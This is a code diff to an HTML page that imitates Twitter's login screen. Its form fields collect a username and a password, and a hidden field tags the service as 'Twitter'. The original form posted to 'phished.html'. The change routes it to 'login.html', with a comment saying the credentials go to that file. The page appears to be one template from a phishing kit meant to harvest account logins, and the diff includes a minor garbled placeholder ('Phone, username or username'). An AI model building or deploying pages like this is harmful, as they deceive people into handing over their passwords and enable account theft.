@@ -11,7 +11,6 @@
 
     <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
     <link href="//use.fontawesome.com/releases/v5.8.2/css/all.css" rel="stylesheet" />
-    <link href="../reset.css" rel="stylesheet" />
     <link href="twitter.css" rel="stylesheet" />
 
   </head>
@@ -23,8 +22,9 @@
       <!-- form center container -->
       <main class="twitter-container">
 
-        <!-- form object -->
-        <form class="twitter-form" action="../phished.html" method="POST" autocomplete="off">
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="twitter-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Twitter" />
 
           <!-- default heading -->
           <div class="twitter-heading">
@@ -32,14 +32,14 @@
             <h1>See what’s happening in the world right now</h1>
           </div>
 
-          <!-- email input -->
-          <div class="twitter-input twitter-email">
-            <input name="_email" value="" placeholder="Phone, email or username" type="text" />
+          <!-- username input -->
+          <div class="twitter-input twitter-username">
+            <input type="text" name="_username" value="" placeholder="Phone, username or username" />
           </div>
 
           <!-- hidden password input -->
           <div class="twitter-input twitter-password">
-            <input name="_password" value="" placeholder="Password" type="password" />
+            <input type="password" name="_password" value="" placeholder="Password" />
             <a href="#">Forgot password?</a>
           </div>
 
